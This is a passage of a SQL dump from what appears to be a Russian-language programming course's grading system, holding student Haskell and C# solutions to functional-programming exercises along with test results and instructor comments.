{1,2,3,4,5,1};\r\n\r\n            Console.WriteLine(allDifferent(a));\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3749, 101, '419046', '2012-11-19 16:16:45', 2, '   --- У вас циклится на примере simplify (Mult X X) (бесконечно пытается упростить)\r\n   --- Попробуйте исправить, пожалуйста.\r\n   --- Если вдруг не получится, можете выложить снова это же решение, я его засчитаю.\r\ndata Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\nsimplify (Mult _ (N 0)) = (N 0)\r\n\r\nsimplify (Mult (N 0) _) = (N 0)\r\n\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\n\r\nsimplify X = X\r\n\r\nsimplify (N x) = (N x)\r\n\r\nsimplify (Mult e1 e2) = simplify (Mult (simplify e1) (simplify e2))\r\n', 'Не удалось вычислить выражение "simplify (Mult X X)", проверьте правильность синтаксиса'),
(3750, 95, '3431532', '2012-11-19 17:11:44', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication4\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            int[] a = { 1, 5, 51, 11 , 25 , 33, 122};\r\n            Console.WriteLine(allDifferent(a));   \r\n        }\r\n\r\n        public static bool allDifferent(int[] a)\r\n        {\r\n            return allDifferent1(a, 0, t => true);\r\n        }\r\n        public static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n        {\r\n            if (from == a.Length)\r\n                return true;\r\n            int x = a[from];\r\n\r\n            return cond(a[from]) && allDifferent1(a, ++from, t => (t != x) && cond(t));\r\n        }\r\n    \r\n    \r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3751, 102, '419046', '2012-11-19 17:35:15', 1, 'import Data.List\r\n\r\nsortedlist xs = reverse((sort xs))\r\n\r\nfindMajor xs =\r\n\r\n             if (head(sortedlist xs) > sum(tail(sortedlist xs))) then Just (head(sortedlist xs))\r\n\r\n             else  Nothing\r\n\r\n             \r\n', '<br/>Тесты успешно пройдены!'),
(3752, 95, '533223', '2012-11-19 18:13:51', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace PrintTable\r\n{\r\n    class Program\r\n    {\r\n        public static bool allDifferent(int[] a)\r\n        {\r\n            return allDifferent1(a, 0, t => true);\r\n        }\r\n\r\n        public static bool allDifferent1( int[] a, int from,  Predicate<int> cond){\r\n            if(a.Length == from){\r\n                return true;\r\n            }\r\n            else if(cond(a[from])) {\r\n                return allDifferent1(a, from + 1, t => (cond(t)) && (a[from] != t));\r\n            }\r\n            else{\r\n                return false;\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n\r\n            Console.WriteLine(allDifferent(new int[] { 2, 3 }));\r\n            Console.WriteLine(allDifferent(new int[] { 2, 3, 2 }));\r\n        \r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(3753, 103, '419046', '2012-11-19 18:22:46', 1, 'find cond [] err = err\r\n\r\nfind cond (x:xs) err = if cond x then x\r\n\r\n                       else find cond xs err\r\n\r\nfindInLists [] (cond) 0 = 0\r\n\r\nfindInLists (x:xs) (cond) 0 = find (cond) x (findInLists xs (cond) 0)\r\n', '<br/>Тесты успешно пройдены!'),
(3754, 104, '419046', '2012-11-19 18:39:24', 1, 'doubleEven xs = xs >>= x -> if (mod x 2 == 0) then [x,x]\r\n\r\n                             else [x]\r\n', '<br/>Тесты успешно пройдены!'),
(3755, 100, '787463', '2012-11-19 19:27:18', 0, 'allDiffLists'' _ 0 _ = [[]]\r\nallDiffLists'' n k check = [ (i:xs) | i <- [1..n], not (check i), xs <- allDiffLists'' n (k-1) (	 -> check i || t == i)]\r\n\r\nallDiffLists n k = allDiffLists'' n k (const False)', 'Выражение имеет неправильное значение: length (allDiffLists 3 3)'),
(3756, 105, '355679', '2012-11-19 19:30:04', 1, 'cartesian xs ys = xs >>= x -> ys >>= y -> [(x,y)]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3757, 104, '355679', '2012-11-19 19:32:15', 1, 'doubleEven xs = xs >>= x -> if x `mod` 2 == 0 then [x,x] else [x]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3758, 100, '787463', '2012-11-19 19:32:56', 1, 'allDiffLists'' _ 0 _ = [[]]\r\nallDiffLists'' n k check = [ (i:xs) | i <- [1..n], not (check i), xs <- allDiffLists'' n (k-1) (	 -> check t || t == i)]\r\n\r\nallDiffLists n k = allDiffLists'' n k (const False)', '<br/>Тесты успешно пройдены!'),
(3759, 101, '787463', '2012-11-19 19:33:18', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving (Eq, Show)\r\n\r\nsimplify (Add s1 s2) = Add (simplify s1) (simplify s2)\r\nsimplify (Mult m1 m2) =\r\n    let\r\n      sm1 = simplify m1\r\n      sm2 = simplify m2\r\n    in if sm1 == N 0 || sm2 == N 0 then N 0 else Mult sm1 sm2\r\nsimplify e = e', '<br/>Тесты успешно пройдены!'),
(3760, 102, '787463', '2012-11-19 19:33:52', 1, 'findMajor xs = findMajor'' xs (sum xs)\r\nfindMajor'' [] _ = Nothing\r\nfindMajor'' (x:xs) s = if 2 * x > s then Just x else findMajor'' xs s', '<br/>Тесты успешно пройдены!'),
(3761, 103, '787463', '2012-11-19 19:34:07', 1, 'find cond [] err = err\r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\nfindInLists [] _ err = err\r\nfindInLists (xs:xss) cond err = find cond xs (findInLists xss cond err)', '<br/>Тесты успешно пройдены!'),
(3762, 104, '787463', '2012-11-19 19:34:21', 1, 'doubleEven xs = xs >>= x -> if x `mod` 2 == 0 then [x, x] else [x]', '<br/>Тесты успешно пройдены!'),
(3763, 100, '44060', '2012-11-19 19:34:34', 0, 'allDiffLists n k = func n k []\r\n	where\r\n		func _ 0 _ = [[]]\r\n		func n k ch = [ (x:xs) | x <- [1..n], xs <- func n (k-1) (x:ch)]', 'Выражение имеет неправильное значение: length (allDiffLists 3 3)'),
(3764, 105, '787463', '2012-11-19 19:34:35', 1, 'cartesian xs ys = xs >>= x -> ys >>= y -> [(x, y)]', '<br/>Тесты успешно пройдены!'),
(3765, 100, '44060', '2012-11-19 19:35:08', 2, '  --- На самом деле примерно такое решение мы писали на последнем занятии.\r\n  --- (только лучше x <- [1..n], not(elem x ch), xs <- func n (k-1) (x:ch)\r\n  ---  чтобы как можно раньше отсеивать не подходящие числа)\r\n  --- В этой задаче, поэтому, еще есть доп.условие - использовать в последнем параметре не\r\n  --- список, а логическую функцию (точно также, как мы делали с allDiff\r\nallDiffLists n k = func n k []\r\n	where\r\n		func _ 0 _ = [[]]\r\n		func n k ch = [ (x:xs) | x <- [1..n], xs <- func n (k-1) (x:ch), not(elem x ch)]', '<br/>Тесты успешно пройдены!'),
(3766, 108, '2118411', '2012-11-19 19:42:31', 1, 'queens n k = gen n 1 k (\\_ _->True)\r\ngen n kk k cond\r\n	| kk > k = [[]]\r\n	| otherwise = [(i,j):xs|i<-[1..kk],j<-[1..n],cond i j, xs<-gen n (kk+1) k (a b->cond a b && (a/=i) && (b/=j) && (abs (a-i) /= abs (b-j)))]\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3767, 95, '4837959', '2012-11-19 19:48:03', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n \r\n\r\nclass Program\r\n\r\n{\r\n\r\n	public static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n\r\n	{\r\n\r\n		if (from == a.Length)\r\n\r\n			return true;\r\n\r\n		if (!cond(a[from]))\r\n\r\n			return false;\r\n\r\n		return allDifferent1(a, from + 1, t => cond(t) && t != a[from]);\r\n\r\n	}\r\n\r\n\r\n\r\n	public static bool allDifferent(int[] a)\r\n\r\n	{\r\n\r\n		return allDifferent1(a, 0, t => true);\r\n\r\n	}\r\n\r\n\r\n\r\n    	static void Main()\r\n\r\n    	{\r\n\r\n		int[] a = {1, 2, 3, 2, 4};\r\n\r\n        	Console.WriteLine(allDifferent(a));\r\n\r\n		int[] b = {1, 2, 3, 4};\r\n\r\n        	Console.WriteLine(allDifferent(b));\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3768, 103, '355679', '2012-11-19 20:07:17', 1, '  --- Я совсем не это имел в виду, но ОК, засчитано и мы эт обсудим.\r\nstraighten = foldr\r\n\r\n  (xs res -> xs ++ res)\r\n\r\n  []\r\n\r\n\r\n\r\nfindInLists xs = findInLists'' (straighten xs)\r\n\r\n\r\n\r\nfindInLists'' [] _ err = err\r\n\r\nfindInLists'' (x:xs) cond err = if cond x then x else findInLists'' xs cond err\r\n\r\n\r\n\r\ntest1 = (findInLists [[1,8,2], [2,7]] (>5) 0) == 8\r\n\r\ntest2 = findInLists [[1,8,2], [2,7]] (>10) 0 == 0\r\n\r\ntest = test1 && test2\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3769, 107, '2118411', '2012-11-19 20:17:32', 1, 'data LogExpr = X | Or LogExpr LogExpr | And LogExpr LogExpr | Not LogExpr | T | F\r\n        deriving Show\r\n\r\ninstance Eq LogExpr where\r\n        T==T = True\r\n        F==F = True\r\n        F==T = False\r\n        T==F = False\r\n        le1 == le2 = (logEval le1 T == logEval le2 T) && (logEval le1 F == logEval le2 F)\r\n\r\nlogEval X val = val\r\nlogEval T val = T\r\nlogEval F val = F\r\nlogEval (Not T) val = F\r\nlogEval (Not F) val = T\r\nlogEval (Not le) val = logEval (Not (logEval le val)) val\r\nlogEval (And le1 le2) val\r\n        | (l==T&&r==T) = T\r\n        | otherwise = F\r\n        where\r\n                l = logEval le1 val\r\n                r = logEval le2 val\r\nlogEval (Or le1 le2) val\r\n        | (l==T||r==T) = T\r\n        | otherwise = F\r\n        where\r\n                l = logEval le1 val\r\n                r = logEval le2 val\r\n', '<br/>Тесты успешно пройдены!'),
(3770, 107, '12206137', '2012-11-19 20:22:35', 1, 'data LogExpr =\r\n\r\n      T\r\n\r\n    | F\r\n\r\n    | X\r\n\r\n    | Or LogExpr LogExpr\r\n\r\n    | And LogExpr LogExpr\r\n\r\n    | Not LogExpr\r\n\r\n\r\n\r\neval T _ = True\r\n\r\neval F _ = False\r\n\r\neval X x = x\r\n\r\neval (Or a b) x = eval a x || eval b x\r\n\r\neval (And a b) x = eval a x && eval b x\r\n\r\neval (Not a) x = not $ eval a x\r\n\r\n\r\n\r\ninstance Eq LogExpr where\r\n\r\n    a == b = eval a True == eval b True && eval a False == eval b False\r\n', '<br/>Тесты успешно пройдены!'),
(3771, 96, '4837959', '2012-11-19 20:28:04', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n \r\n\r\nclass Program\r\n\r\n{\r\n\r\n	static void Main()\r\n\r\n	{\r\n\r\n		int [] a = { 1, 5, 8 };\r\n\r\n		int [] b = { 3, 5, 9 };\r\n\r\n		foreach (int i in Merge(a, b))\r\n\r\n		{\r\n\r\n			Console.WriteLine(i);\r\n\r\n		}\r\n\r\n	}\r\n\r\n\r\n\r\n  	public static IEnumerable<int> Merge(int[] a, int[] b)\r\n\r\n 	{\r\n\r\n		IEnumerator<int> e1 = ((IEnumerable<int>)a).GetEnumerator();\r\n\r\n		IEnumerator<int> e2 = ((IEnumerable<int>)b).GetEnumerator();\r\n\r\n		bool hasNext1 = e1.MoveNext();\r\n\r\n		bool hasNext2 = e2.MoveNext();\r\n\r\n		while (true) {\r\n\r\n			if (hasNext1 && hasNext2)\r\n\r\n			{\r\n\r\n				if (e1.Current <= e2.Current)\r\n\r\n				{\r\n\r\n					if (e1.Current < e2.Current)\r\n\r\n						yield return e1.Current;\r\n\r\n					hasNext1 = e1.MoveNext();\r\n\r\n				}\r\n\r\n				else\r\n\r\n				{\r\n\r\n					yield return e2.Current;\r\n\r\n					hasNext2 = e2.MoveNext();\r\n\r\n				}\r\n\r\n			}\r\n\r\n			else if (hasNext1)\r\n\r\n			{\r\n\r\n				yield return e1.Current;\r\n\r\n				hasNext1 = e1.MoveNext();\r\n\r\n			}\r\n\r\n			else if (hasNext2)\r\n\r\n			{\r\n\r\n				yield return e2.Current;\r\n\r\n				hasNext2 = e2.MoveNext();\r\n\r\n			}\r\n\r\n			else\r\n\r\n			{\r\n\r\n				yield break;\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3772, 108, '12206137', '2012-11-19 21:10:43', 1, '(|>) x f = f x\r\n\r\n\r\n\r\nqueens'' cond curk n k\r\n\r\n    | curk == k+1 = [[]]\r\n\r\n    | otherwise =\r\n\r\n        [1..n]\r\n\r\n        |> map (i ->\r\n\r\n                    if not (cond curk i) then []\r\n\r\n                    else [(curk,i) : tail | tail <- queens'' (k'' i'' -> cond k'' i'' && i'' /= i && abs (i-i'') /= abs (curk-k''))\r\n\r\n                                                (curk + 1) n k]\r\n\r\n               )\r\n\r\n        |> concat\r\n\r\n    \r\n\r\n\r\n\r\nqueens = queens'' (\\_ _ -> True) 1\r\n', '<br/>Тесты успешно пройдены!'),
(3773, 94, '63706456', '2012-11-19 23:43:28', 2, '  --- Вот такая схема неправильно рисуется:\r\n  ---   Paral (Conseq (Res 1) (Res 1)) (Res 1)\r\n  --- Попробуйте дописать, пожалуйста - до четверга включительно, скажем.\r\nimport Data.List\r\n\r\ndata Scheme = Res Double| Conseq Scheme Scheme | Paral Scheme Scheme\r\n\r\ninstance Show Scheme where\r\n	show = foldr (x y -> x ++ "\r\n" ++ y) [] . fst . draw\r\n\r\nljoiner size n1 n2 n3 = map func [1..size] \r\n			where func x 	| x < n1 = "  "\r\n					| x == n1 = " +"\r\n					| x < n2 = " |"\r\n					| x == n2 = "-+"\r\n					| x < n3 = " |"\r\n					| x == n3 = " +"\r\n					| x > n3 = "  "\r\n\r\nconsjoiner size n = map (x-> if x==n then "-" else " ") [1..size]\r\n\r\njoinLists lss = map (foldr (++) []) (transpose lss)\r\n\r\nlistFrom key length = map (const key) [1..length]\r\n\r\nextendLength 0 _ ls = ls\r\nextendLength n key (x:xs) = x: (extendLength (n-1) key xs)\r\nextendLength n key [] = listFrom key n\r\n\r\nextendList n key lst@(l:ls) = 	let addition = take (abs n) (cycle [listFrom key (length l)]) in \r\n				if n > 0 \r\n				then addition ++ lst\r\n				else lst ++ addition\r\n\r\ndraw (Res n) = (["-[" ++ show n ++ "]-"], 1)\r\ndraw (Paral s1 s2) = paralJoin (draw s1) (draw s2) \r\ndraw (Conseq s1 s2) = conseqJoin (draw s1) (draw s2)\r\n\r\n\r\n\r\nparalJoin (lss1, n1) (lss2,n2) = let 	size = length lss1 + length lss2 + 1\r\n					middle = length lss1 + 1\r\n					ljnr = ljoiner size n1 middle (n2 + middle)\r\n					rjnr = map reverse ljnr\r\n					maxLen = foldr1 max (map length (lss1 ++ lss2))\r\n					center = map (extendLength maxLen '' '') (lss1 ++ [""] ++ lss2)	in\r\n					(map (foldr (++) []) (transpose [ljnr, center, rjnr]), middle)\r\n\r\nconseqJoin (lss, n1) (lss2, n2) = (joinLists [lst1'', consjoiner maxLen num, lst2''], num)\r\n				where 	(lst1, lst2, num) = if n1 > n2 \r\n								then (lss, extendList (n1-n2) '' '' lss2, n1) \r\n								else (extendList (n2-n1) '' '' lss, lss2, n2)\r\n					maxLen = max (length lst1) (length lst2)\r\n					lst1'' = extendList ((length lst1) - maxLen) '' '' lst1\r\n					lst2'' = extendList ((length lst2) - maxLen) '' '' lst2', '<br/>Тесты успешно пройдены!'),
(3774, 105, '63706456', '2012-11-19 23:49:59', 1, 'cartesian xs ys = xs >>= (x -> ys >>= (y -> [(x,y)]))', '<br/>Тесты успешно пройдены!'),
(3775, 104, '63706456', '2012-11-19 23:51:27', 1, 'doubleEven xs = xs >>= (x -> if even x then [x,x] else [x])', '<br/>Тесты успешно пройдены!'),
(3776, 93, '51559263', '2012-11-20 00:44:49', 1, '--- Срок уже давно вышел, но я просто хотел довести задачу до конца. Да уж, провёл несколько дней в размышлениях над ней, \r\n\r\n--- а решение (если оно верное, конечно, а то неправильных у меня накопилась уже целая коллекция) \r\n\r\n--- оказалось гораздо проще всех моих теоритических домыслов =)\r\n  --- ОК, очень хорошо, засчитано!\r\n  --- Просто как замечание: можно было немного короче ту же идею записать, если воспользоваться функцией merge \r\n\r\n\r\nf ( x : xs ) n = let \r\n\r\n                     xxx = 3*x\r\n\r\n			     in \r\n\r\n                    if xxx > 10^n\r\n\r\n                    then 10^n : xxx : f xs (n+1)\r\n\r\n			        else xxx : f xs n\r\n\r\n			   \r\n\r\nham = 1 : f ham 1\r\n', '<br/>Тесты успешно пройдены!'),
(3777, 103, '63706456', '2012-11-20 03:12:31', 1, 'find (x:xs) p def = if p x then x else find xs p def\r\nfind [] _ def = def\r\n\r\nfindInLists (ls:lss) p def = find ls p (findInLists lss p def)\r\nfindInLists [] _ def = def', '<br/>Тесты успешно пройдены!'),
(3778, 102, '63706456', '2012-11-20 03:29:07', 1, 'find p (x:xs) = if p x then Just x else find p xs\r\nfind _ [] = Nothing\r\n\r\nfindMajor ls = 	find (x -> x > (sumLs - x)) ls\r\n		where sumLs = sum ls', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3779, 101, '533223', '2012-11-20 05:11:13', 1, 'data Expr = X | N Integer | Add Expr Expr| Mult Expr Expr deriving Show\r\n\r\nfoldExpr fa fm x fn (X) = x\r\nfoldExpr fa fm x fn (N n) = fn n\r\nfoldExpr fa fm x fn (Add e1 e2) = fa ef1 ef2\r\n				where \r\n					ef1 = foldExpr fa fm x fn e1\r\n					ef2 = foldExpr fa fm x fn e2\r\nfoldExpr fa fm x fn (Mult e1 e2) = fm ef1 ef2\r\n				where \r\n					ef1 = foldExpr fa fm x fn e1\r\n					ef2 = foldExpr fa fm x fn e2\r\n\r\nsimplify expr = foldExpr ( x y -> Add x y) (simpMult) (X) (\r\n -> N n) expr\r\n\r\n\r\nsimpMult (N 0) _ = (N 0)\r\nsimpMult _ (N 0) = (N 0)\r\nsimpMult x y = (Mult x y)', '<br/>Тесты успешно пройдены!'),
(3780, 96, '533223', '2012-11-20 08:01:51', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace PrintTable\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n\r\n        {\r\n\r\n            var aEnum = a.GetEnumerator();\r\n\r\n            var bEnum = b.GetEnumerator();\r\n\r\n            int? j = null;\r\n\r\n            int i = -100;\r\n\r\n            while (aEnum.MoveNext())\r\n\r\n            {\r\n\r\n                i = aEnum.Current;\r\n\r\n                if (j.HasValue)\r\n\r\n                {\r\n\r\n                    if (j < i)\r\n\r\n                        yield return j.Value;\r\n\r\n                    else if (j > i)\r\n\r\n                    {\r\n\r\n                        yield return i;\r\n\r\n                        continue;\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                    {\r\n\r\n                        yield return i;\r\n\r\n                        bEnum.MoveNext();\r\n\r\n                        j = bEnum.Current;\r\n\r\n                        continue;\r\n\r\n                    \r\n\r\n                    }\r\n\r\n                }\r\n\r\n                if (!bEnum.MoveNext())\r\n\r\n                {\r\n\r\n                    j = null;\r\n\r\n                    yield return i;\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    j = bEnum.Current;\r\n\r\n\r\n\r\n                    if (j < i)\r\n\r\n                    {\r\n\r\n                        yield return j.Value;\r\n\r\n                    }\r\n\r\n                    else if (j > i)\r\n\r\n                    {\r\n\r\n                        yield return i; continue;\r\n\r\n                    }\r\n\r\n                    else\r\n\r\n                    {\r\n\r\n                        yield return i;\r\n\r\n                        bEnum.MoveNext();\r\n\r\n                        j = bEnum.Current;\r\n\r\n                        continue;\r\n\r\n                    }\r\n\r\n\r\n\r\n                    while (bEnum.MoveNext())\r\n\r\n                    {\r\n\r\n                        j = bEnum.Current;\r\n\r\n\r\n\r\n                        if (j < i)\r\n\r\n                        {\r\n\r\n                            yield return j.Value;\r\n\r\n                        }\r\n\r\n                        else if (j > i)\r\n\r\n                        {\r\n\r\n                            yield return i; break;\r\n\r\n                        }\r\n\r\n                        else\r\n\r\n                        {\r\n\r\n                            yield return i;\r\n\r\n                            bEnum.MoveNext();\r\n\r\n                            j = bEnum.Current;\r\n\r\n                            break;\r\n\r\n                        }\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n            if (j.HasValue) {\r\n\r\n                yield return j.Value; \r\n\r\n            }\r\n\r\n            while (bEnum.MoveNext())\r\n\r\n            {\r\n\r\n                j = bEnum.Current;\r\n\r\n                yield return j.Value;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = { 1, 5, 8 };\r\n\r\n            int[] b = { 3, 5, 12, 13, 16 };\r\n\r\n\r\n\r\n            foreach (int i in Merge(a, b))\r\n\r\n            {\r\n\r\n                 Console.WriteLine(i);\r\n\r\n            }\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3781, 102, '1384577', '2012-11-20 08:20:01', 1, 'findMajor xs | maximum xs > sum xs - maximum xs = Just $ maximum xs\r\n             | otherwise = Nothing', '<br/>Тесты успешно пройдены!'),
(3782, 102, '318210', '2012-11-20 10:23:59', 1, 'findMajor (x:xs) = f1 (x:xs) 0\r\n\r\nf1 [] _ = Nothing\r\nf1 (x:xs) t | x > sum xs + t = Just x\r\n		| otherwise = f1 xs (x + t)', '<br/>Тесты успешно пройдены!'),
(3783, 96, '397095', '2012-11-20 10:36:07', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace FunctionalProgramming\r\n\r\n{\r\n\r\n	class Differences\r\n\r\n	{\r\n\r\n		static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n\r\n		{\r\n\r\n			IEnumerator<int> ea = a.GetEnumerator();\r\n\r\n			IEnumerator<int> eb = b.GetEnumerator();\r\n\r\n			bool has_a = ea.MoveNext();\r\n\r\n			bool has_b = eb.MoveNext();\r\n\r\n			while (has_a || has_b)\r\n\r\n			{\r\n\r\n				if (has_a && has_b)\r\n\r\n				{\r\n\r\n					int ca = ea.Current;\r\n\r\n					int cb = eb.Current;\r\n\r\n					if (ca < cb)\r\n\r\n					{\r\n\r\n						has_a = ea.MoveNext();\r\n\r\n						yield return ca;\r\n\r\n					}\r\n\r\n					else if (cb < ca)\r\n\r\n					{\r\n\r\n						has_b = eb.MoveNext();\r\n\r\n						yield return cb;\r\n\r\n					}\r\n\r\n					else\r\n\r\n					{\r\n\r\n						has_a = ea.MoveNext();\r\n\r\n						has_b = eb.MoveNext();\r\n\r\n						yield return ca;\r\n\r\n					}\r\n\r\n				}\r\n\r\n				else if (has_a)\r\n\r\n				{\r\n\r\n					yield return ea.Current;\r\n\r\n					has_a = ea.MoveNext();\r\n\r\n				}\r\n\r\n				else if (has_b)\r\n\r\n				{\r\n\r\n					yield return eb.Current;\r\n\r\n					has_b = eb.MoveNext();\r\n\r\n				}\r\n\r\n			}\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args) \r\n\r\n		{\r\n\r\n			int [] a = { 1, 5, 8 };\r\n\r\n			int [] b = { 3, 5, 9 };\r\n\r\n			foreach (int i in Merge(a, b))\r\n\r\n			{\r\n\r\n				Console.WriteLine(i);\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3784, 102, '397095', '2012-11-20 10:43:44', 1, 'findMajor xs = let s = sum xs in head (map (	 -> Just t) (filter (	 -> s - t < t) xs) ++ [Nothing])', '<br/>Тесты успешно пройдены!'),
(3785, 104, '397095', '2012-11-20 10:51:41', 1, 'doubleEven xs = xs >>= (	 -> if mod t 2 == 0 then [t,t] else [t])', '<br/>Тесты успешно пройдены!'),
(3786, 100, '4169333', '2012-11-20 11:01:30', 0, 'addDiffLists n k = addDiffLists1 n k (	->True)\r\naddDiffLists1 n 0 cond = [[]]\r\naddDiffLists1 n k cond = [(i:xs)| i<-[1..n],cond i,xs<-addDiffLists1 n (k-1) (	-> cond t && t/=i)]\r\n', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3787, 100, '4169333', '2012-11-20 11:02:36', 1, 'allDiffLists n k = allDiffLists1 n k (	->True)\r\nallDiffLists1 n 0 cond = [[]]\r\nallDiffLists1 n k cond = [(i:xs)| i<-[1..n],cond i,xs<-allDiffLists1 n (k-1) (	-> cond t && t/=i)]', '<br/>Тесты успешно пройдены!'),
(3788, 101, '4169333', '2012-11-20 11:05:02', 1, 'data Expr = X | N Integer | Add Expr Expr |Mult Expr Expr deriving (Show,Eq)\r\nsimplify (N n)=N n\r\nsimplify X=X\r\nsimplify (Add a b)=Add (simplify a) (simplify b)\r\nsimplify (Mult (N 0) b)=N 0\r\nsimplify (Mult a (N 0))=N 0\r\nsimplify (Mult a b)= if ( (simplify a == (N 0)) || (simplify b == (N 0)) )\r\n		     then (N 0)\r\n                     else Mult (simplify a) (simplify b)\r\n   --- Лучше только не вызывать simplify по 2 раза (с помощью let, например)', '<br/>Тесты успешно пройдены!'),
(3789, 102, '4169333', '2012-11-20 11:05:37', 1, 'findMajor xs=find1 xs []\r\nfind1 [] xs = Nothing\r\nfind1 (x:xs) s= if (x> sum(s++xs)) then\r\n		Just x\r\n                else find1 (xs) (s++[x])\r\n', '<br/>Тесты успешно пройдены!'),
(3790, 103, '4169333', '2012-11-20 11:06:24', 1, 'find cond [] err= err\r\nfind cond (x:xs) err= if cond x \r\n		      then x\r\n		      else find cond xs err\r\n\r\nfindInLists [] cond err=err\r\nfindInLists (x:xs) cond err= find cond x (findInLists xs cond err)\r\n', '<br/>Тесты успешно пройдены!'),
(3791, 104, '4169333', '2012-11-20 11:06:46', 1, 'doubleEven xs= xs>>= x -> if (mod x 2==0) then [x,x]\r\n			   else [x]', '<br/>Тесты успешно пройдены!'),
(3792, 105, '4169333', '2012-11-20 11:09:31', 1, 'cartesian xs ys=xs>>= x-> cart1 x ys\r\ncart1 x ys = ys >>= y-> [(x,y)] ', '<br/>Тесты успешно пройдены!'),
(3793, 101, '318210', '2012-11-20 11:15:02', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\nsimp (Mult (N x) ex)\r\n	| x == 0 = (N 0)\r\n	| otherwise = (Mult (N x) ex)\r\n\r\nsimp (Mult ex (N x))\r\n	| x == 0 = (N 0)\r\n	| otherwise = (Mult ex (N x))\r\n\r\nsimplify (X) = X\r\nsimplify (N i) = (N i)\r\n\r\nsimplify (Mult a b) = simp ( Mult (simplify a) ( simplify b) )\r\nsimplify (Add a b) = Add (simplify a) ( simplify b)\r\n\r\n-- при желании можно ещё и Add упростить', 'Не удалось вычислить выражение "simplify (Mult X X)", проверьте правильность синтаксиса'),
(3794, 101, '318210', '2012-11-20 11:17:35', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\nsimp (Mult (N x) ex)\r\n	| x == 0 = (N 0)\r\n	| otherwise = (Mult (N x) ex)\r\n\r\nsimp (Mult ex (N x))\r\n	| x == 0 = (N 0)\r\n	| otherwise = (Mult ex (N x))\r\n\r\nsimp (Mult ex1 ex2) = Mult ex1 ex2\r\n\r\nsimplify (X) = X\r\nsimplify (N i) = (N i)\r\n\r\nsimplify (Mult a b) = simp ( Mult (simplify a) ( simplify b) )\r\nsimplify (Add a b) = Add (simplify a) ( simplify b)\r\n\r\n-- при желании можно ещё и Add упростить\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3795, 104, '1384577', '2012-11-20 12:00:56', 1, 'doubleEven xs = xs >>= x -> if even x then [x,x] else [x]', '<br/>Тесты успешно пройдены!'),
(3796, 110, '472848', '2012-11-20 12:18:43', 1, 'partial class Program\r\n{\r\n  static int Find(Predicate<int> pred, int[] a, Func<int> err)\r\n  {\r\n    foreach (int i in a)\r\n    {\r\n      if (pred(i)) return i;\r\n    }\r\n    return err();\r\n  }\r\n\r\n  static void Main(string[] args)\r\n  {\r\n    int[] a1 = { 1, 2, 7 };\r\n    int[] a2 = { 11, 2, 19 };\r\n    int[] a3 = { 21 };\r\n    Func<int[], int> f = a => Find(x => x < 10, a, () => Find(x => x < 20, a, () => 20));\r\n    Console.WriteLine("{0} {1} {2}", f(a1), f(a2), f(a3));\r\n  }\r\n}', '<br/>Тесты успешно пройдены!'),
(3797, 105, '1384577', '2012-11-20 12:28:06', 1, 'cartesian xs ys = xs >>= (x -> ys >>= (y -> return (x,y)))', '<br/>Тесты успешно пройдены!'),
